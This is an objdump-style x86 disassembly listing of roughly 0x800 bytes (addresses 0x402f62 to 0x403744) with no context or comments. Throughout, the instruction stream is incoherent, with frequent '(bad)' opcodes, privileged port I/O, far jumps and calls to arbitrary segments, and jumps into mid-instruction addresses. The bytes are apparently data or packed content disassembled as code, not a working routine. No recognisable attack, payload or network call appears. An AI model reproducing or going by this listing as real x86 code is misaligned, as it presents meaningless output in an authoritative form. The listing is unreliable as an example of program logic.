  402f62:	inc    ebx
  402f63:	jmp    FWORD PTR [esi+0x258e44ed]
  402f69:	or     eax,0xc344f4da
  402f6e:	out    dx,al
  402f6f:	mov    esi,0x5fd3ef27
  402f74:	push   ds
  402f75:	and    BYTE PTR [edx+0x18bec2ef],0x68
  402f7c:	frstor [eax+ecx*4]
  402f7f:	pushf  
  402f80:	cwde   
  402f81:	add    al,BYTE PTR [esi-0x2aed332b]
  402f87:	adc    ah,BYTE PTR [edx+0x1e4aac5f]
  402f8d:	fstp   TBYTE PTR [ebp+0x368fe20]
  402f93:	mov    dh,0x53
  402f95:	(bad)  
  402f96:	mov    ds:0x2fe4e152,eax
  402f9b:	(bad)  
  402f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f9d:	push   esi
  402f9e:	lahf   
  402f9f:	sbb    ecx,edi
  402fa1:	arpl   WORD PTR [ecx+0x2ae37634],ax
  402fa7:	or     al,0x62
  402fa9:	add    BYTE PTR [esi],bh
  402fab:	xchg   DWORD PTR [ebx-0x798a5447],ecx
  402fb1:	lods   eax,DWORD PTR ds:[esi]
  402fb2:	imul   edx,DWORD PTR [eax+0x8],0x7e1bbd23
  402fb9:	or     eax,0x2eb7d15c
  402fbe:	sub    dh,BYTE PTR [eax-0x41]
  402fc1:	add    BYTE PTR [eax+0x7b],cl
  402fc4:	ja     0x402fae
  402fc6:	xchg   edi,eax
  402fc7:	xor    cl,BYTE PTR [ebx]
  402fc9:	sbb    BYTE PTR [esi+0x65],0x2e
  402fcd:	mov    bh,0xce
  402fcf:	adc    BYTE PTR [edx+0x5a],bh
  402fd2:	mov    dl,BYTE PTR [edi]
  402fd4:	pop    ss
  402fd5:	out    dx,eax
  402fd6:	mov    edi,0xbb84617
  402fdb:	setns  bl
  402fde:	lahf   
  402fdf:	xor    al,BYTE PTR [esi+eax*1-0x3d]
  402fe3:	arpl   WORD PTR [ebp-0x43602170],di
  402fe9:	xor    BYTE PTR es:[ecx],bl
  402fec:	cmp    DWORD PTR [esp+eax*2-0x6b],edx
  402ff0:	xor    al,0x64
  402ff2:	cmp    al,0x1c
  402ff4:	fldcw  WORD PTR [edx-0x65f60203]
  402ffa:	dec    edx
  402ffb:	dec    esi
  402ffc:	push   0x60
  402ffe:	or     eax,0xaeb7cbc0
  403003:	bound  esp,QWORD PTR [edx-0x7c]
  403006:	inc    esi
  403007:	add    eax,0x5492a52e
  40300c:	sub    eax,0xe4f45294
  403011:	and    eax,0x86aa435c
  403016:	push   ss
  403017:	addr16 jns 0x402fe1
  40301a:	pop    ds
  40301b:	pop    esp
  40301c:	xchg   DWORD PTR [edi],ebx
  40301e:	test   DWORD PTR [esi+0x5],ecx
  403021:	jns    0x402ff3
  403023:	mov    DWORD PTR [eax+eax*2-0x305f76b0],esp
  40302a:	mov    esi,0x35714038
  40302f:	mov    al,ds:0x668c4add
  403034:	arpl   WORD PTR [edi+ebp*4],ax
  403037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403038:	out    0x7a,eax
  40303a:	add    al,BYTE PTR [edi]
  40303c:	cmp    DWORD PTR [edx],edx
  40303e:	mov    eax,0xa18d29da
  403043:	sahf   
  403044:	(bad)  
  403045:	mov    WORD PTR [esi+0x51043897],ds
  40304b:	retf   
  40304c:	jge    0x40308a
  40304e:	pop    edx
  40304f:	mov    ah,0x59
  403051:	xor    DWORD PTR [edx-0xa],esi
  403054:	dec    edi
  403055:	test   al,0x46
  403057:	cmc    
  403058:	das    
  403059:	and    dh,dl
  40305b:	jecxz  0x403059
  40305d:	jno    0x403069
  40305f:	lahf   
  403060:	sbb    al,bl
  403062:	xchg   BYTE PTR [esi],dl
  403064:	push   esp
  403065:	dec    ebx
  403066:	mov    ds:0xb6d18145,al
  40306b:	pop    ecx
  40306c:	xchg   edx,eax
  40306d:	sbb    DWORD PTR [ebx],esp
  40306f:	mov    fs,WORD PTR [esp+ebp*1+0x22]
  403073:	push   esi
  403074:	cli    
  403075:	jp     0x4030cc
  403077:	inc    esp
  403078:	jno    0x40300b
  40307a:	ds mov BYTE PTR ss:[ecx-0x14],cl
  40307f:	cmp    eax,0x1775bc14
  403084:	jbe    0x40304f
  403086:	lea    edx,[edi-0x325f7258]
  40308c:	lock push ss
  40308e:	and    BYTE PTR [edi+0x6a],0x86
  403092:	push   0x7cf32f8b
  403097:	int    0xd7
  403099:	sbb    eax,0x8b6d8f16
  40309e:	inc    ebp
  40309f:	in     eax,dx
  4030a0:	pop    es
  4030a1:	ret    
  4030a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a3:	adc    eax,DWORD PTR [ebp-0x3a0f92af]
  4030a9:	cs push cs
  4030ab:	fcomp  QWORD PTR [edi-0x57]
  4030ae:	fnsave [ebx-0x7e7f735d]
  4030b4:	or     BYTE PTR cs:[ebx-0x76],al
  4030b8:	xor    ebx,DWORD PTR [esi-0x4f]
  4030bb:	and    esi,DWORD PTR [esi+0x7bb8514]
  4030c1:	repz push ss
  4030c3:	push   0x3dcc5dc3
  4030c8:	jmp    0xc606:0xbaf93c7a
  4030cf:	push   eax
  4030d0:	jmp    0x25d6b61b
  4030d5:	ins    DWORD PTR es:[edi],dx
  4030d6:	or     BYTE PTR [ecx],0x8f
  4030d9:	in     al,0x9c
  4030db:	or     DWORD PTR [esi+0x1d],ebx
  4030de:	adc    ebp,DWORD PTR cs:[edx+0x3c]
  4030e2:	xchg   BYTE PTR [ebp+0x1ae22cf],ah
  4030e8:	(bad)  
  4030ea:	mov    DWORD PTR [edi-0x7084fa6b],esi
  4030f0:	add    edi,ecx
  4030f2:	jge    0x403135
  4030f4:	pusha  
  4030f5:	sub    BYTE PTR [edx],cl
  4030f7:	leave  
  4030f8:	sub    DWORD PTR [ebp-0x61],0xffffffc0
  4030fc:	mov    bl,0xd2
  4030fe:	pop    ebp
  4030ff:	loop   0x403113
  403101:	xchg   ebx,eax
  403102:	sbb    ecx,0xfffffff7
  403105:	jnp    0x403141
  403107:	or     esi,DWORD PTR [edx]
  403109:	ins    BYTE PTR es:[edi],dx
  40310a:	mov    esp,DWORD PTR [esi+0x1b]
  40310d:	jmp    0xd0f2757f
  403112:	and    ah,BYTE PTR [ebx+0x6d27579c]
  403118:	add    al,0x94
  40311a:	out    dx,al
  40311b:	adc    eax,0xf8a288ad
  403120:	adc    ch,dh
  403122:	dec    esi
  403123:	pop    edx
  403124:	inc    esi
  403125:	arpl   WORD PTR [esp+edx*1-0xf336859],bx
  40312c:	inc    ecx
  40312d:	daa    
  40312e:	pop    ebx
  40312f:	mov    ebx,0x3e6e23fd
  403134:	shl    bl,0x8f
  403137:	xor    al,0xc4
  403139:	sti    
  40313a:	jmp    0xb0ddf15
  40313f:	fsincos 
  403141:	xchg   esp,eax
  403142:	and    BYTE PTR [ecx],bl
  403144:	push   ds
  403145:	fs or  eax,0x6894134
  40314b:	icebp  
  40314c:	fsubr  QWORD PTR [esi+0x73]
  40314f:	call   0xdf81:0x33990d2d
  403156:	fnsave [eax-0x5ada0614]
  40315c:	xor    cl,BYTE PTR [ecx+0x17]
  40315f:	mov    edx,es
  403161:	sub    bl,BYTE PTR [edi+0x12]
  403164:	ja     0x403189
  403166:	sub    al,0x20
  403168:	ds leave 
  40316a:	add    al,0x72
  40316c:	inc    ecx
  40316d:	xchg   ecx,eax
  40316e:	jle    0x4030f5
  403170:	jmp    0x403191
  403172:	lock mov esi,DWORD PTR [eax+eax*2+0x4f3324ac]
  40317a:	push   0xffffff81
  40317c:	or     DWORD PTR [edi],esp
  40317e:	jge    0x4031af
  403180:	shl    DWORD PTR [eax],1
  403182:	push   esi
  403183:	sub    BYTE PTR gs:[eax-0x6f1c5e91],cl
  40318a:	or     ebx,DWORD PTR [edx-0x4e]
  40318d:	popf   
  40318e:	xchg   ebx,eax
  40318f:	scas   al,BYTE PTR es:[edi]
  403190:	pusha  
  403191:	mov    eax,ds:0x6c57773
  403196:	ins    DWORD PTR es:[edi],dx
  403197:	(bad)  
  403198:	imul   eax,DWORD PTR [ebx],0x4291baad
  40319e:	arpl   WORD PTR [edx],sp
  4031a0:	popf   
  4031a1:	repnz xor dl,bh
  4031a4:	cmp    ch,BYTE PTR [edi-0x729a66ca]
  4031aa:	aas    
  4031ab:	sub    ah,cl
  4031ad:	sbb    eax,0xc7b49e7a
  4031b2:	or     DWORD PTR [esi+0x8b2f008],eax
  4031b8:	sbb    ebx,esi
  4031ba:	fwait
  4031bb:	dec    ebx
  4031bc:	(bad)  
  4031bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031be:	fwait
  4031bf:	inc    DWORD PTR [esi]
  4031c1:	jg     0x4031e8
  4031c3:	fmul   DWORD PTR [ecx]
  4031c5:	pushf  
  4031c6:	pop    esi
  4031c7:	retf   0xf350
  4031ca:	inc    edx
  4031cb:	ror    DWORD PTR ds:[edx-0x27],1
  4031cf:	jl     0x4031de
  4031d1:	jg     0x4031ff
  4031d3:	sub    ebp,DWORD PTR [ecx]
  4031d5:	ror    DWORD PTR [eax-0x71],1
  4031d8:	xor    al,0x76
  4031da:	aas    
  4031db:	aas    
  4031dc:	pop    esi
  4031dd:	jge    0x4031bf
  4031df:	arpl   di,di
  4031e1:	push   esi
  4031e2:	and    eax,0x7e7b7b0
  4031e7:	cmp    al,0xc
  4031e9:	inc    edi
  4031ea:	pop    ds
  4031eb:	mul    BYTE PTR [esi-0x5a]
  4031ee:	aad    0x9f
  4031f0:	mov    ds:0x9ac63f1a,eax
  4031f5:	sti    
  4031f6:	xchg   ah,dl
  4031f8:	push   ss
  4031f9:	cs or  eax,0x95e06317
  4031ff:	inc    edx
  403200:	jmp    0x2bd1:0x2ddb2c09
  403207:	adc    al,0x8f
  403209:	leave  
  40320a:	ss in  eax,0xb9
  40320d:	cdq    
  40320e:	adc    BYTE PTR [esi-0x11],dl
  403211:	in     al,0x53
  403213:	fcomi  st,st(6)
  403215:	push   esp
  403216:	mov    dl,0x11
  403218:	add    al,0x4d
  40321a:	mov    ah,0x50
  40321c:	enter  0xc5c2,0xba
  403220:	fmul   QWORD PTR [edx-0x24d6f0cb]
  403226:	test   DWORD PTR [ecx-0x61],eax
  403229:	aaa    
  40322a:	mov    edi,0x70df2155
  40322f:	inc    ebx
  403230:	sub    al,0x99
  403232:	imul   eax,DWORD PTR [eax-0x1722d8ef],0x820d62ab
  40323c:	ins    DWORD PTR es:[edi],dx
  40323d:	inc    esp
  40323e:	scas   al,BYTE PTR es:[edi]
  40323f:	das    
  403240:	mov    cl,0x3f
  403242:	ds jo  0x40321a
  403245:	pop    esp
  403246:	mov    dh,0xfa
  403248:	push   edi
  403249:	fisub  DWORD PTR [eax]
  40324b:	sub    ebp,DWORD PTR [ebx]
  40324d:	test   edi,ebx
  40324f:	pop    ebx
  403250:	mov    bh,0x58
  403252:	rol    BYTE PTR [ecx],0x2a
  403255:	imul   BYTE PTR [ecx+ebp*4-0x66]
  403259:	pop    edi
  40325a:	call   0x823761e8
  40325f:	test   al,0x46
  403261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403262:	ss je  0x4032cf
  403265:	ja     0x403281
  403267:	sub    eax,0xdea9189a
  40326c:	fdivr  QWORD PTR [ecx]
  40326e:	pop    esp
  40326f:	sti    
  403270:	scas   eax,DWORD PTR es:[edi]
  403271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403272:	mov    ds:0x77dfb13e,eax
  403277:	das    
  403278:	mov    ebx,0xa31eafd4
  40327d:	and    ch,BYTE PTR [edi]
  40327f:	adc    DWORD PTR [eax-0x4f6faede],ebx
  403285:	jge    0x4032b9
  403287:	std    
  403288:	lods   al,BYTE PTR ds:[esi]
  403289:	sub    ah,dl
  40328b:	mov    dh,0x7a
  40328d:	ds retf 
  40328f:	idiv   DWORD PTR [esi-0xf0c1b58]
  403295:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403297:	pop    ecx
  403298:	pop    eax
  403299:	jno    0x4032d0
  40329b:	push   edx
  40329c:	aam    0xd3
  40329e:	mov    cl,0x9a
  4032a0:	mov    dl,0xf8
  4032a2:	mov    ch,0xeb
  4032a4:	mov    cl,0x35
  4032a6:	mov    bl,0xae
  4032a8:	shr    eax,0x2c
  4032ab:	push   es
  4032ac:	bsr    eax,DWORD PTR [edi+0x65fd0886]
  4032b3:	popa   
  4032b4:	pop    ebp
  4032b5:	mov    ebp,0xda2891d0
  4032ba:	push   cs
  4032bb:	push   edi
  4032bc:	mov    ah,0x8e
  4032be:	aam    0x4a
  4032c0:	xor    DWORD PTR [edx],ebx
  4032c2:	(bad)  
  4032c3:	pushf  
  4032c4:	jmp    0xa0:0x38fbead7
  4032cb:	pop    esp
  4032cc:	loopne 0x403318
  4032ce:	inc    ebx
  4032cf:	loopne 0x403343
  4032d1:	dec    ebp
  4032d2:	lods   eax,DWORD PTR ds:[esi]
  4032d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d4:	leave  
  4032d5:	sub    al,dl
  4032d7:	and    DWORD PTR [ebx+0xb],esp
  4032da:	(bad)  
  4032db:	push   ss
  4032dc:	xchg   ebp,eax
  4032dd:	scas   al,BYTE PTR es:[edi]
  4032de:	test   BYTE PTR [edi-0x67],ch
  4032e1:	mov    eax,ds:0x8ba7b6e5
  4032e6:	ret    
  4032e7:	jmp    0xa416:0x261abb09
  4032ee:	std    
  4032ef:	fwait
  4032f0:	inc    eax
  4032f1:	sub    BYTE PTR [ecx-0x7],cl
  4032f4:	inc    edi
  4032f5:	push   es
  4032f6:	mov    al,0x88
  4032f8:	lods   eax,DWORD PTR ds:[esi]
  4032f9:	sahf   
  4032fa:	(bad)  
  4032fb:	arpl   dx,bx
  4032fd:	mov    eax,0x765d1f2d
  403302:	imul   esp,DWORD PTR [edi+esi*1+0x32],0xffffff92
  403307:	mov    ch,0x5a
  403309:	out    dx,eax
  40330a:	repz icebp 
  40330c:	fcomp  QWORD PTR [ebx-0x54]
  40330f:	xor    al,0xfc
  403311:	xchg   edi,eax
  403312:	test   al,0xdd
  403314:	sbb    al,0xd6
  403316:	and    BYTE PTR [eax+esi*8],0x34
  40331a:	or     eax,0x1b0fa02e
  40331f:	retf   
  403320:	sub    ah,al
  403322:	mov    ecx,0x6382b81e
  403327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403328:	loope  0x403332
  40332a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332b:	(bad)  
  40332c:	jmp    0x4032eb
  40332e:	std    
  40332f:	ret    0x90bd
  403332:	rcr    DWORD PTR [eax+0x2c],cl
  403335:	test   BYTE PTR [edx+0x5ec1ad92],al
  40333b:	js     0x4032c8
  40333d:	test   eax,0xf426f32e
  403342:	je     0x403330
  403344:	push   ebp
  403345:	dec    edi
  403346:	mov    dh,0x1e
  403349:	mov    cs,edx
  40334b:	or     al,BYTE PTR [ebx]
  40334d:	pop    ds
  40334e:	mov    al,0x3a
  403350:	mov    WORD PTR [edi-0x409bda21],ds
  403356:	or     al,0xe3
  403358:	or     eax,0x810a799b
  40335d:	cmp    BYTE PTR [edx],0xd1
  403360:	xor    edx,ebx
  403362:	dec    esp
  403363:	cmc    
  403364:	mov    esp,0x2d030822
  403369:	sub    BYTE PTR [eax+0x60f70f71],0xf7
  403370:	jbe    0x403359
  403372:	mov    cl,0x10
  403374:	inc    esi
  403375:	xchg   DWORD PTR [esi+ebp*8+0xc],edi
  403379:	ins    DWORD PTR es:[edi],dx
  40337a:	adc    DWORD PTR [eax-0x6ad0fd8d],esp
  403380:	cdq    
  403381:	inc    edi
  403382:	test   BYTE PTR [ebx+0x6eeae68f],0xd2
  403389:	push   ebx
  40338a:	inc    ecx
  40338b:	sub    DWORD PTR [esi],edx
  40338d:	das    
  40338e:	cmp    eax,0xcd548a6c
  403393:	xor    al,0xa9
  403395:	push   esp
  403396:	loop   0x4033b6
  403398:	popf   
  403399:	and    DWORD PTR [ebp-0x27],esp
  40339c:	outs   dx,DWORD PTR ds:[esi]
  40339d:	rol    ebp,1
  40339f:	or     edx,DWORD PTR [ebx-0x142fafd4]
  4033a5:	fnsave [ebx+0x5d]
  4033a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033a9:	mov    al,0x4a
  4033ab:	daa    
  4033ac:	sbb    DWORD PTR [edx+0xf],esi
  4033af:	mov    ?,WORD PTR [edx+0x2e041a74]
  4033b5:	jmp    0x8af49348
  4033ba:	inc    edx
  4033bb:	jae    0x4033e5
  4033bd:	pop    es
  4033be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033bf:	add    eax,0xbf1c672a
  4033c4:	lds    edx,FWORD PTR [eax+0x3b]
  4033c7:	loop   0x4033c9
  4033c9:	std    
  4033ca:	dec    edx
  4033cb:	mov    edx,0x57452b2a
  4033d0:	ja     0x4033f2
  4033d2:	pop    DWORD PTR [edi]
  4033d4:	and    eax,0x7b6f9fd2
  4033d9:	pushf  
  4033da:	inc    edi
  4033db:	cmc    
  4033dc:	jg     0x403365
  4033de:	aaa    
  4033df:	add    eax,0x45d65962
  4033e4:	nop
  4033e5:	es pop esi
  4033e7:	cmp    BYTE PTR [ebx],0xa7
  4033ea:	(bad)  
  4033eb:	jecxz  0x40341c
  4033ed:	and    eax,DWORD PTR [edx]
  4033ef:	pop    ecx
  4033f0:	ds push 0x75caed33
  4033f6:	ins    DWORD PTR es:[edi],dx
  4033f7:	push   0xd262d637
  4033fc:	xchg   esp,eax
  4033fd:	cmp    DWORD PTR [edi+0x1],ebx
  403400:	icebp  
  403401:	inc    edi
  403402:	push   es
  403403:	test   eax,0x54a85c29
  403408:	jmp    0xa31ef791
  40340d:	sbb    eax,DWORD PTR [edx-0x5477117]
  403413:	shl    BYTE PTR [edi+0x1455efd2],1
  403419:	js     0x4033f8
  40341b:	outs   dx,DWORD PTR ds:[esi]
  40341c:	retf   0xab95
  40341f:	retf   0xec07
  403422:	in     eax,dx
  403423:	xchg   edx,eax
  403424:	xor    BYTE PTR [edx],dh
  403426:	repz jecxz 0x4033e1
  403429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40342a:	mov    ah,0x19
  40342c:	or     BYTE PTR [esi-0x3989c33a],dl
  403432:	pop    ss
  403433:	daa    
  403434:	sub    DWORD PTR [edi-0x50],ebp
  403437:	iret   
  403438:	fwait
  403439:	inc    esi
  40343a:	and    cl,BYTE PTR [edx]
  40343c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40343d:	sbb    DWORD PTR [edi+0x6d],esi
  403440:	dec    ebx
  403441:	mov    bl,0x7e
  403443:	mov    eax,0xbc5639a1
  403448:	arpl   ax,bp
  40344a:	iret   
  40344b:	push   ds
  40344c:	pop    es
  40344d:	sbb    cl,BYTE PTR [eax]
  40344f:	push   esi
  403450:	shl    esi,0x3a
  403453:	inc    ebx
  403454:	imul   DWORD PTR [esi-0x4e]
  403457:	mov    esp,0x5a2834ab
  40345c:	out    0x59,al
  40345e:	xor    al,0xf7
  403460:	inc    esi
  403461:	pop    ebx
  403462:	shr    edi,1
  403464:	xchg   DWORD PTR [ecx-0x2b],esp
  403467:	icebp  
  403468:	retf   0xd27d
  40346b:	(bad)  
  40346c:	cli    
  40346d:	or     al,0x52
  40346f:	mov    bh,0xb1
  403471:	push   0xb69c2aaa
  403476:	ins    BYTE PTR es:[edi],dx
  403477:	pop    ebp
  403478:	push   ebp
  403479:	push   esp
  40347a:	ins    DWORD PTR es:[edi],dx
  40347b:	lock test eax,0x84e96b
  403481:	aam    0x54
  403483:	mov    bh,0x62
  403485:	jmp    0x9ab9:0xb669656
  40348c:	data16 jns 0x403481
  40348f:	shl    BYTE PTR ds:0x488eca4d,1
  403495:	(bad)  
  403496:	sbb    eax,0x3619d600
  40349b:	inc    esp
  40349c:	(bad)  
  40349d:	and    ch,dh
  40349f:	repnz sub al,0x30
  4034a2:	loopne 0x4034b7
  4034a4:	mov    esi,0xf2c03090
  4034a9:	aas    
  4034aa:	pop    esi
  4034ab:	push   0xffffffd4
  4034ad:	adc    DWORD PTR [ebx],ecx
  4034af:	icebp  
  4034b0:	ret    
  4034b1:	jp     0x4034ac
  4034b3:	and    DWORD PTR [ecx],esp
  4034b5:	mov    dl,0xf8
  4034b7:	lahf   
  4034b8:	inc    ecx
  4034b9:	add    eax,0xc5101168
  4034be:	daa    
  4034bf:	dec    esi
  4034c0:	push   edx
  4034c1:	xchg   esp,eax
  4034c2:	and    BYTE PTR [eax],dh
  4034c4:	loope  0x40353c
  4034c6:	ja     0x40350d
  4034c8:	dec    esi
  4034c9:	adc    BYTE PTR [ecx-0x5d7240bc],0x36
  4034d0:	icebp  
  4034d1:	cmp    eax,0x343db916
  4034d6:	dec    edx
  4034d7:	loopne 0x403550
  4034d9:	loope  0x403510
  4034db:	sbb    ebx,DWORD PTR [ecx+0x16]
  4034de:	pop    edx
  4034df:	and    al,0x5
  4034e1:	(bad)  
  4034e2:	push   esi
  4034e3:	inc    eax
  4034e4:	mov    ds:0x8d43a5fb,al
  4034e9:	xchg   ecx,eax
  4034ea:	addr16 stc 
  4034ec:	add    eax,DWORD PTR [esi]
  4034ee:	stos   DWORD PTR es:[edi],eax
  4034ef:	cmp    BYTE PTR [edi+edx*2-0x56],dl
  4034f3:	sbb    al,0x92
  4034f5:	or     dh,0x67
  4034f8:	cmp    eax,ecx
  4034fa:	ins    BYTE PTR es:[edi],dx
  4034fb:	jmp    0xe5e4e33d
  403500:	bound  ecx,QWORD PTR [edx+0x29fa2c6c]
  403506:	inc    edi
  403507:	repnz add al,0x8b
  40350a:	xchg   DWORD PTR [eax],esi
  40350c:	mov    al,ds:0xdc7302b5
  403511:	adc    ah,BYTE PTR [esi+0x59f9babf]
  403517:	push   esi
  403518:	jne    0x4034ab
  40351a:	das    
  40351b:	sub    eax,0x4a94678c
  403520:	ret    0x5cda
  403523:	and    esi,DWORD PTR [edx+0x59]
  403526:	aam    0x38
  403528:	sub    eax,0xb3b076d4
  40352d:	stc    
  40352e:	jg     0x403528
  403530:	test   eax,0xb2b235d0
  403535:	or     BYTE PTR [ebp+eax*4-0xa],dl
  403539:	or     al,0xc9
  40353b:	mov    ebx,0xc3a11972
  403540:	cmp    ah,BYTE PTR [ecx-0x42]
  403543:	xchg   ecx,eax
  403544:	je     0x4034ce
  403546:	mov    edi,DWORD PTR [ecx-0xf4ad079]
  40354c:	dec    edx
  40354d:	lds    ebx,FWORD PTR [ebp+0x6f]
  403550:	sbb    BYTE PTR [ebx],cl
  403552:	lahf   
  403553:	(bad)  
  403554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403555:	jecxz  0x40356d
  403557:	enter  0x78bd,0xa
  40355b:	mov    ebp,0x12010eb
  403560:	pop    ecx
  403561:	dec    edx
  403562:	pop    ss
  403563:	inc    ecx
  403564:	xor    ebp,edi
  403566:	xor    bl,BYTE PTR [edi+0x1f81a714]
  40356c:	pop    ss
  40356d:	out    dx,al
  40356e:	lahf   
  40356f:	arpl   WORD PTR [esi+ebx*4+0x7],si
  403573:	or     eax,0xb79a6b1c
  403578:	jl     0x403544
  40357a:	push   es
  40357b:	mov    al,ds:0xb5e9c16
  403580:	ds inc ebp
  403582:	or     eax,0xe54d3ee7
  403587:	stos   BYTE PTR es:[edi],al
  403588:	int3   
  403589:	push   ebx
  40358a:	and    al,0x33
  40358c:	sub    bh,BYTE PTR [ebp+ebx*4+0xb97dc4a]
  403593:	jns    0x4035f3
  403595:	adc    esp,DWORD PTR [esi-0x74fb3b00]
  40359b:	repnz adc DWORD PTR [edi-0x56],ecx
  40359f:	mov    edx,0xea32722b
  4035a4:	(bad)  ds:0x272f1b84
  4035aa:	xchg   edx,eax
  4035ab:	ja     0x403570
  4035ad:	cmp    DWORD PTR [esi+0x782eb347],eax
  4035b3:	out    dx,eax
  4035b4:	test   al,0xdf
  4035b6:	mov    ah,BYTE PTR [esi+0x5f6f0262]
  4035bc:	jae    0x40354c
  4035be:	into   
  4035bf:	mov    bh,0xf2
  4035c1:	sub    ecx,edi
  4035c3:	fs int3 
  4035c5:	mov    eax,ds:0x20f0c892
  4035ca:	mov    eax,0x4b9939a1
  4035cf:	aas    
  4035d0:	push   edx
  4035d1:	(bad)  
  4035d2:	pop    eax
  4035d3:	add    eax,0x22dfa84f
  4035d8:	inc    ebx
  4035d9:	lds    edi,FWORD PTR [eax+ebp*1-0x20]
  4035dd:	mov    gs,eax
  4035df:	les    eax,FWORD PTR [ecx+0x580a9ae0]
  4035e5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4035e7:	ins    DWORD PTR es:[edi],dx
  4035e8:	jb     0x403656
  4035ea:	add    BYTE PTR [eax-0x3300cb29],0x4
  4035f1:	test   al,0xe8
  4035f3:	test   eax,0xbb573a33
  4035f8:	in     eax,0x73
  4035fa:	leave  
  4035fb:	fadd   QWORD PTR [esi]
  4035fd:	inc    ebp
  4035fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ff:	pop    esp
  403600:	inc    edx
  403601:	popf   
  403602:	adc    al,BYTE PTR [ebx+0x4ee1d38f]
  403608:	ss popa 
  40360a:	imul   esp,DWORD PTR [edi],0x80923c7a
  403610:	and    eax,DWORD PTR [edx-0xd11c1d2]
  403616:	mov    ebp,0x4f130609
  40361b:	lahf   
  40361c:	(bad)  
  40361d:	cdq    
  40361e:	cwde   
  40361f:	in     eax,dx
  403620:	call   0x34ce:0xda1af69f
  403627:	imul   ecx,eax,0xeee140c0
  40362d:	cmp    BYTE PTR [esp+esi*8-0x3a],dl
  403631:	mov    ebp,0x23d36db4
  403636:	test   DWORD PTR [esi+0x6c],ebx
  403639:	int3   
  40363a:	jg     0x403675
  40363c:	add    BYTE PTR cs:[esi-0x7eead45],ah
  403643:	sub    BYTE PTR [edi-0x4f],ah
  403646:	repnz lods al,BYTE PTR ds:[esi]
  403648:	sbb    al,BYTE PTR [edx-0x5de4ef1e]
  40364e:	xor    esi,DWORD PTR [ecx-0x43]
  403651:	jnp    0x40362f
  403653:	test   eax,0xccb8284
  403658:	out    dx,eax
  403659:	add    eax,0x2e34c713
  40365e:	xchg   BYTE PTR [eax+0x2385b9ff],bh
  403664:	rcr    DWORD PTR ds:0x1610f362,cl
  40366a:	ds cli 
  40366c:	mov    ecx,0x84c548ed
  403671:	sub    eax,0x3818377e
  403676:	and    bl,ch
  403678:	into   
  403679:	aaa    
  40367a:	inc    ebx
  40367b:	mov    eax,ds:0x221e00b0
  403680:	sub    edi,DWORD PTR [esp+esi*1+0xc]
  403684:	icebp  
  403685:	and    ecx,ebp
  403687:	(bad)  [esi]
  403689:	and    dl,BYTE PTR [edx+esi*4-0x65]
  40368d:	inc    esi
  40368e:	retf   
  40368f:	add    dh,ah
  403691:	fcomi  st,st(3)
  403693:	(bad)  
  403695:	xor    bh,BYTE PTR [eax]
  403697:	jl     0x4036d3
  403699:	jg     0x4036b0
  40369b:	ret    
  40369c:	mov    edi,0x99046c3c
  4036a1:	sub    ebx,esi
  4036a3:	xchg   edi,eax
  4036a4:	pop    ebx
  4036a5:	mov    esi,0x2b0c1843
  4036aa:	sub    ebp,DWORD PTR [edi+esi*4-0x72]
  4036ae:	sti    
  4036af:	push   0x31a47244
  4036b4:	ror    BYTE PTR [eax],0x8a
  4036b7:	(bad)  
  4036b8:	out    dx,eax
  4036b9:	push   ebx
  4036ba:	sub    al,0x6a
  4036bc:	(bad)  
  4036bd:	cli    
  4036be:	and    edi,DWORD PTR [ecx+0x3f]
  4036c1:	rcr    BYTE PTR [ecx],0xdc
  4036c4:	(bad)  ds:0x606e787d
  4036ca:	dec    edi
  4036cb:	imul   ecx,DWORD PTR [ebp-0x4310978c],0xf8cd21e3
  4036d5:	fwait
  4036d6:	inc    ebp
  4036d7:	fwait
  4036d8:	jnp    0x403707
  4036da:	jmp    0xb399789c
  4036df:	and    DWORD PTR [ebx],ebp
  4036e1:	int3   
  4036e2:	jae    0x403705
  4036e4:	daa    
  4036e5:	leave  
  4036e6:	outs   dx,DWORD PTR ds:[esi]
  4036e7:	adc    DWORD PTR [ebp+0x29],edx
  4036ea:	dec    esp
  4036eb:	fadd   st,st(1)
  4036ed:	in     al,0xc
  4036ef:	lea    edi,[ecx-0x4a933d46]
  4036f5:	xchg   edx,eax
  4036f6:	adc    al,0xdc
  4036f8:	lods   eax,DWORD PTR ds:[esi]
  4036f9:	inc    ecx
  4036fa:	ds mov esp,0xbcc91302
  403700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403701:	mov    al,ds:0x9c44f354
  403706:	and    al,0xc8
  403708:	(bad)  
  403709:	jl     0x403747
  40370b:	push   0xffffff9a
  40370d:	fsubr  DWORD PTR [ecx-0x44]
  403710:	sub    BYTE PTR [eax+0x45c03ae],cl
  403716:	fisubr DWORD PTR [esi]
  403718:	add    BYTE PTR [eax],0xd3
  40371b:	xor    edi,ebp
  40371d:	jle    0x4036b4
  40371f:	push   esi
  403720:	arpl   WORD PTR ds:[ecx+0x62],bx
  403724:	and    al,0x6f
  403726:	mov    ecx,0x76600291
  40372b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40372c:	hlt    
  40372d:	mov    ah,0xfb
  40372f:	test   eax,0xe31c72b7
  403734:	cmp    al,0x47
  403736:	pop    edi
  403737:	jno    0x40371d
  403739:	dec    esp
  40373a:	inc    eax
  40373b:	scas   eax,DWORD PTR es:[edi]
  40373c:	xchg   eax,esp
  40373e:	int3   
  40373f:	scas   eax,DWORD PTR es:[edi]
  403740:	push   esi
  403741:	inc    edx
  403742:	sbb    al,0xc6
  403744:	cmp    ebp,DWORD PTR [ebp-0x2f]
